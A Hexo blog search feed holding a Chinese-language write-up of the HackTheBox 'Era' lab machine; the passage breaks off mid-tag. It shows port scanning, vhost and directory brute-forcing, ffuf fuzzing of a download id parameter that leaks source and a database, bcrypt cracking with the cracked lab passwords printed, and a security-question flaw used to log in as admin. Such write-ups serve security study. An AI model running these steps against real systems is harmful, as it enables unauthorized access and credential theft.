<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HackTheBox-Era</title>
    <link href="/2025/11/17/HackTheBox-Era/"/>
    <url>/2025/11/17/HackTheBox-Era/</url>
    
    <content type="html"><![CDATA[<p>我还在这儿<br>忽然就没有力气了</p><hr><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> ./rustscan -a <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>.<span class="hljs-comment">----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`<span class="hljs-comment">-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> <span class="hljs-comment">--------------------------------------</span><br><span class="hljs-number">0</span>day was here ♥<br><br>[~] The config file <span class="hljs-keyword">is</span> expected <span class="hljs-keyword">to</span> be at &quot;/root/.rustscan.toml&quot;<br>[!] File <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> lower than <span class="hljs-keyword">default</span> batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span><br>[!] Your file <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-string">&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;</span><span class="hljs-comment">--ulimit 5000&#x27;. </span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span>:<span class="hljs-number">21</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span>:<span class="hljs-number">80</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-17</span> <span class="hljs-number">01</span>:<span class="hljs-number">04</span> EST<br>Initiating Ping Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Scanning <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span> [<span class="hljs-number">4</span> ports]<br>Completed Ping Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.11</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.01</span>s elapsed<br>DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.01</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]<br>Initiating SYN Stealth Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Scanning <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span> [<span class="hljs-number">2</span> ports]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">80</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">21</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Completed SYN Stealth Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.20</span>s elapsed (<span class="hljs-number">2</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Host <span class="hljs-keyword">is</span> up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0.097</span>s latency).<br>Scanned at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-17</span> <span class="hljs-number">01</span>:<span class="hljs-number">04</span>:<span class="hljs-number">41</span> EST <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>s<br><br>PORT   STATE SERVICE REASON<br><span class="hljs-number">21</span>/tcp <span class="hljs-keyword">open</span>  ftp     syn-ack ttl <span class="hljs-number">63</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    syn-ack ttl <span class="hljs-number">63</span><br><br><span class="hljs-keyword">Read</span> data files <span class="hljs-keyword">from</span>: /usr/<span class="hljs-keyword">share</span>/nmap<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.44</span> seconds<br>           Raw packets sent: <span class="hljs-number">6</span> (<span class="hljs-number">240</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">ftp <span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span><br>Connected to <span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span>.<br><span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">5</span>)<br>Name (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span>:kali): anonymous<br><span class="hljs-number">331</span> Please specify the password.<br>Password: <br><span class="hljs-number">530</span> Login incorrect.<br>ftp: Login failed<br>ftp&gt; <br>ftp&gt; <span class="hljs-keyword">exit</span><br><span class="hljs-number">221</span> Goodbye.<br><br></code></pre></td></tr></table></figure><p>ftp没法匿名登录，查看web界面。</p><p>合理怀疑是这几个人名中的一个，先将这些人名写成字典备用。</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_W3fV5Gxy5W.png"></p><p>子域名爆破有结果。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"> gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://era.htb/ -t 30 --append-domain</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:             http://era.htb/<br>[+] Method:          GET<br>[+] Threads:         30<br>[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:      gobuster/3.6<br>[+] Timeout:         10s<br>[+] Append Domain:   true<br>===============================================================<br>Starting gobuster in VHOST enumeration mode<br>===============================================================<br>Found: file.era.htb Status: 200 [Size: 6765]<br><span class="hljs-section">Progress: 114441 / 114442 (100.00%)</span><br><span class="hljs-section">===============================================================</span><br><span class="hljs-section">Finished</span><br><span class="hljs-section">===============================================================</span><br><br></code></pre></td></tr></table></figure><p><img src="/2025/11/17/HackTheBox-Era/vmware_Vgad4D6DC5.png"></p><p>四个选项都提示登录，但用上面的人名配上常见的弱密码都没有结果。</p><p>ftp也尝试爆破，没有结果。</p><p>尝试爆破目录。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix">─<span class="hljs-comment"># dirsearch -u http://file.era.htb</span><br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>python3<span class="hljs-operator">/</span>dist-packages<span class="hljs-operator">/</span>dirsearch<span class="hljs-operator">/</span>dirsearch.py:<span class="hljs-number">23</span>: <span class="hljs-params">UserWarning:</span> pkg_resources is deprecated as an API. See https:<span class="hljs-symbol">//setuptools.pypa.io/en/latest/pkg_resources.html.</span> The pkg_resources package is slated for removal as early as <span class="hljs-number">202</span>5-<span class="hljs-number">1</span>1-<span class="hljs-number">30</span>. Refrain from using this package <span class="hljs-keyword">or</span> pin to Setuptools<span class="hljs-operator">&lt;</span><span class="hljs-number">81</span>.<br>  from pkg_resources <span class="hljs-built_in">import</span> DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                           <br> (_<span class="hljs-operator">||</span>| _) (<span class="hljs-operator">/</span>_(_<span class="hljs-operator">||</span> (_| )                                                                                                                                    <br>                                                                                                                                                           <br><span class="hljs-params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="hljs-params">method:</span> GET | <span class="hljs-params">Threads:</span> <span class="hljs-number">25</span> | Wordlist <span class="hljs-params">size:</span> <span class="hljs-number">11460</span><br><br>Output <span class="hljs-params">File:</span> <span class="hljs-symbol">/home/kali/Desktop/reports/http_file.era.htb/_25-11-17_01-36-25.txt</span><br><br><span class="hljs-params">Target:</span> http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-symbol">/</span><br><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>] <span class="hljs-params">Starting:</span>                                                                                                                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.ht_wsr.txt</span>                                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.sample</span>                                 <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.orig</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.bak1</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.save</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_extra</span>                                  <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_orig</span>                                   <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_sc</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessBAK</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD2</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htm</span>                                             <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.html</span>                                            <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.httr-oauth</span>                                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswds</span>                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswd_test</span>                                   <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/assets</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>assets<span class="hljs-symbol">/</span>          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>assets<span class="hljs-symbol">/</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">58</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/download.php</span>  <span class="hljs-operator">-&gt;</span>  login.php                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/files</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>files<span class="hljs-symbol">/</span>            <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-symbol">/</span>                                           <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>cache<span class="hljs-symbol">/</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>tmp<span class="hljs-symbol">/</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">04</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>images<span class="hljs-symbol">/</span>                                          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">04</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/images</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>images<span class="hljs-symbol">/</span>          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">08</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">34</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/LICENSE</span>                                          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">9</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/login.php</span>                                        <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">70</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/logout.php</span>                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">10</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/manage.php</span>  <span class="hljs-operator">-&gt;</span>  login.php                        <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">20</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">3</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/register.php</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">31</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/upload.php</span>  <span class="hljs-operator">-&gt;</span>  login.php   <br></code></pre></td></tr></table></figure><p>扫到了一个注册界面，注册账号成功登录，似乎可以上传文件。</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_9nJv1PNyyd.png"></p><p>上传文件后给了一个下载链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://file.era.htb/download.php?<span class="hljs-built_in">id</span>=7817<br></code></pre></td></tr></table></figure><p>注意到有个参数id。</p><p>可能还有其他的文件可以下载，fuzz一下。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix">ffuf <span class="hljs-operator">-</span>u <span class="hljs-string">&quot;http://file.era.htb/download.php?id=FUZZ&quot;</span> <span class="hljs-operator">-</span>w id.txt <span class="hljs-operator">-</span>H &#x27;Cookie:PHPSESSID<span class="hljs-operator">=</span>jufdhn16ovg3aop3qtp2jevmgg&#x27; <span class="hljs-operator">-</span>fw <span class="hljs-number">3161</span><br><br>        <span class="hljs-operator">/</span>&#x27;___\  <span class="hljs-operator">/</span>&#x27;___\           <span class="hljs-operator">/</span>&#x27;___\       <br>       <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span>  __  __  <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span>       <br>       \ \ ,__\\ \ ,__\<span class="hljs-operator">/</span>\ \<span class="hljs-operator">/</span>\ \ \ \ ,__\      <br>        \ \ \_<span class="hljs-symbol">/</span> \ \ \_<span class="hljs-operator">/</span>\ \ \_\ \ \ \ \_<span class="hljs-symbol">/</span>      <br>         \ \_\   \ \_\  \ \____<span class="hljs-symbol">/</span>  \ \_\       <br>          \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>    \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>   \<span class="hljs-operator">/</span>___<span class="hljs-symbol">/</span>    \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>       <br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>dev<br>________________________________________________<br><br> :: <span class="hljs-params">Method           :</span> GET<br> :: <span class="hljs-params">URL              :</span> http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>download.php<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span>FUZZ<br> :: <span class="hljs-params">Wordlist         :</span> <span class="hljs-params">FUZZ:</span> <span class="hljs-symbol">/home/kali/Desktop/id.txt</span><br> :: <span class="hljs-params">Header           :</span> <span class="hljs-params">Cookie:</span> PHPSESSID<span class="hljs-operator">=</span>jufdhn16ovg3aop3qtp2jevmgg<br> :: Follow <span class="hljs-params">redirects :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-params">Calibration      :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-params">Timeout          :</span> <span class="hljs-number">10</span><br> :: <span class="hljs-params">Threads          :</span> <span class="hljs-number">40</span><br> :: <span class="hljs-params">Matcher          :</span> Response <span class="hljs-params">status:</span> <span class="hljs-number">20</span>0-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: <span class="hljs-params">Filter           :</span> Response <span class="hljs-params">words:</span> <span class="hljs-number">3161</span><br>________________________________________________<br><br><span class="hljs-number">54</span>                      [<span class="hljs-params">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-params">Size:</span> <span class="hljs-number">6378</span>, <span class="hljs-params">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-params">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-params">Duration:</span> <span class="hljs-number">141</span>ms]<br><span class="hljs-number">150</span>                     [<span class="hljs-params">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-params">Size:</span> <span class="hljs-number">6366</span>, <span class="hljs-params">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-params">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-params">Duration:</span> <span class="hljs-number">93</span>ms]<br>:: <span class="hljs-params">Progress:</span> [<span class="hljs-number">1000</span><span class="hljs-operator">/</span><span class="hljs-number">1000</span>] :: Job [<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">441</span> req<span class="hljs-symbol">/sec</span> :: <span class="hljs-params">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span>] :: <span class="hljs-params">Errors:</span> <span class="hljs-number">0</span> ::<br><br></code></pre></td></tr></table></figure><p>访问第54个，发现了可能是网站源码。</p><p><img src="/2025/11/17/HackTheBox-Era/0r9ViDFID9.png"></p><p>下载下来发现里面有数据库文件，里面有密码。</p><p><img src="/2025/11/17/HackTheBox-Era/navicat_hNePiOtVRi.png"></p><p>成功破解出两个用户的密码。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt    </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">6</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">6</span> different salts (bcrypt [Blowfish <span class="hljs-number">32</span>/<span class="hljs-number">64</span> X3])<br>Loaded hashes <span class="hljs-keyword">with</span> <span class="hljs-keyword">cost</span> <span class="hljs-number">1</span> (iteration count) <span class="hljs-type">varying</span> <span class="hljs-keyword">from</span> <span class="hljs-number">1024</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4096</span><br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>america          (eric)     <br>mustang          (yuri)     <br><span class="hljs-number">2</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">55</span> <span class="hljs-number">0.03</span>% (ETA: <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">08</span>:<span class="hljs-number">41</span>) <span class="hljs-number">0.01735</span>g/s <span class="hljs-number">47.17</span>p/s <span class="hljs-number">193.6</span>c/s <span class="hljs-number">193.6</span>C/s marias..ilovejack<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> aborted<br><br></code></pre></td></tr></table></figure><p>但是登录上去没有文件可以修改，尝试以管理员的身份登录。</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_WKVWGwqCud.png"></p><p>这里非常奇怪的是，以A用户的身份登录可以修改B用户的密保问题，利用这一点修改管理员的密保问题。</p><p>成功以管理员的身份登录。</p><p><img 